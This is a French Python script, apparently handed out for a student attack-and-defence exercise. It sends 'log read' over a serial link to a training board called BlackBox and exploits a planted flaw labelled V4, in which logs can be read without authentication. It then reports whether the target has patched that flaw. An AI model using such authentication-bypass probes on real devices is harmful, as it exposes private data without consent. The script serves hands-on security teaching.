#!/usr/bin/env python3
"""
read_logs.py — Lit les logs de BlackBox SANS authentification (V4)
GUARDIA B1 — Script fourni pour Phase 1 et War Day

Principe :
    La commande 'log read' fonctionne sans login (V4).
    Ce script se connecte et envoie 'log read' directement.
    Si la cible a corrige V4, le script affiche le message d'erreur.

Usage :
    python read_logs.py COM3
"""

import serial
import time
import sys


def ouvrir_port(port, baud=115200, timeout=3.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def lire_reponse(ser, attente=1.0):
    """Lit tout ce qui arrive pendant 'attente' secondes."""
    reponse = b""
    deadline = time.time() + attente
    while time.time() < deadline:
        data = ser.read(ser.in_waiting or 1)
        if data:
            reponse += data
    return reponse.decode(errors="replace")


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <PORT>")
        sys.exit(1)

    port = sys.argv[1]

    print("=" * 50)
    print("  READ LOGS SANS AUTH — BlackBox B1 GUARDIA")
    print("=" * 50)
    print(f"  Port : {port}")
    print(f"  Exploite V4 : log read sans authentification")
    print("=" * 50)
    print()

    ser = ouvrir_port(port)

    # Attendre le prompt de la carte
    time.sleep(0.5)
    ser.reset_input_buffer()

    print("[*] Envoi de 'log read' sans login...")
    ser.write(b"log read\r\n")
    time.sleep(1.0)

    reponse = lire_reponse(ser, attente=2.0)

    if "Erreur" in reponse or "connecte" in reponse:
        print("[!] La cible a CORRIGE V4 — log read requiert auth.")
        print(f"    Reponse : {reponse.strip()}")
    elif "Aucun log" in reponse:
        print("[~] V4 presente mais aucun log enregistre.")
    elif "[1]" in reponse or "[2]" in reponse:
        print("[+] SUCCES — Logs lus sans authentification :")
        print("-" * 40)
        print(reponse.strip())
        print("-" * 40)
        nb = reponse.count("[")
        print(f"\n    {nb} log(s) recupere(s) sans connexion.")
    else:
        print(f"[?] Reponse inattendue : {reponse.strip()}")

    ser.close()


if __name__ == "__main__":
    main()
